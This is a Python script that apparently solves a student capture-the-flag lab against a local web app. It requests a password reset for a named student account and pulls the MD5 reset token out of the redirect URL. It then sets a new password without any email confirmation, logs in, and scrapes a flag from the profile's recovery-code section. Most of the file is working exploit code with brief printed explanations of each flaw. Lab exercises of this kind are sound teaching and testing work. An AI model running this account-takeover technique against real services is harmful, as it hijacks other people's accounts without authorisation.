#FLAG in pocketbase recovery code for students
#research some more about this

from urllib.parse import urlparse, parse_qs
import sys
import requests

GREEN = "\033[92m"
RED = "\033[91m"
CYAN = "\033[96m"
RESET = "\033[0m"

#login and get session cookie
print("Demonstrating Password Reset 'Workflow'")
input(f"{GREEN}press anything to continue")
print("___________________________________________________________________________________________")
print("___________________________________________________________________________________________")
print("___________________________________________________________________________________________")
print(f"CONTINUING.")
print("___________________________________________________________________________________________")
print("___________________________________________________________________________________________")
print(f"___________________________________________________________________________________________{RESET}")

print(f"{CYAN}--- requesting a password reset for benjamin@student.42.tech ---{RESET}")
email = "benjamin@student.42.tech"
auth = requests.post(
    "http://localhost:4942/reset-password/request",
    data={"email": email},
    allow_redirects=False
)
location = auth.headers.get("location")
print("status:", auth.status_code)
print(f"{CYAN}--- upon sending this off, the URL changes to ---{RESET}")

print(location if location else "no location header")

print(f"{CYAN}--- which is just the email + the md5 token behind it (bad) ---{RESET}")
params = parse_qs(urlparse(location).query)
token = params["token"][0]
print("token:", token)
 
response = requests.get(
        "http://localhost:4942" + location
    )

input(f"{GREEN}press anything to continue ")
print("___________________________________________________________________________________________")
print("___________________________________________________________________________________________")
print("___________________________________________________________________________________________")
print(f"CONTINUING.")
print("___________________________________________________________________________________________")
print("___________________________________________________________________________________________")
print(f"___________________________________________________________________________________________{RESET}")
print("__________")
print(f"{CYAN}--- furthermore, the very next redirect is the site asking us what to set the new password to, without waiting for a confirmation from the actual email (bad) ---{RESET}")
print("response text of resetting benjamins password:\n")
print("__________")

keyword = "Enter your new password"
index = response.text.find(keyword)

# Check if found to avoid slicing from -1
if index != -1:
	result = response.text[index:]
	lines = result.splitlines()[:13]
	print("\n".join(lines))
else:
    print("")


print(f"{CYAN}--- this shows us the url to target for the post request to send off a new password ---{RESET}")


new_password = input("enter your new password here(must be 5 characters): ")
if new_password.__len__() < 5:
     print("must be 5 chars, try again")
     sys.exit(1)
newpass = requests.post(
    "http://localhost:4942/reset-password/confirm",
    data={"email": email, "token": token, "new_password": new_password},
    allow_redirects=False
)

input(f"{GREEN}press anything to continue")
print("___________________________________________________________________________________________")
print("___________________________________________________________________________________________")
print("___________________________________________________________________________________________")
print(f"CONTINUING.")
print("___________________________________________________________________________________________")
print("___________________________________________________________________________________________")
print(f"___________________________________________________________________________________________{RESET}")
print("status:", newpass.status_code)
print("location:", newpass.headers.get("location"))
print(newpass.text[:200])

print(f"{GREEN}--- now that we changed the password, all thats left is to login ---{RESET}")

auth = requests.post(
    "http://localhost:4942/login",
    data={"identity": email, "password": new_password},
    allow_redirects=False
)
 
cookies = auth.cookies
if not cookies.get("session"):
    print("Login failed - no session cookie received")
    print("Status:", auth.status_code)
    print(auth.text[:200])
    sys.exit(1)
 
print(f"{GREEN}Logged in successfully with " + email + " and " + new_password)


print(f"{CYAN}--- Flag can be found in the 'Recovery Code' Section of the Userprofile ---{RESET}")


response = requests.get(
        "http://localhost:4942/profile/me/settings",
        cookies=cookies,
        headers={
            "Origin": "http://localhost:4942",
            "Referer": "http://localhost:4942",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36"
        },
        allow_redirects=False
    )


from bs4 import BeautifulSoup

soup = BeautifulSoup(response.text, "html.parser")

cell = soup.find("div", class_="card-title", string="Account recovery code")

if cell:
    card = cell.parent
    print(card.get_text(separator="\n", strip=True))
else:
    print("ohno")
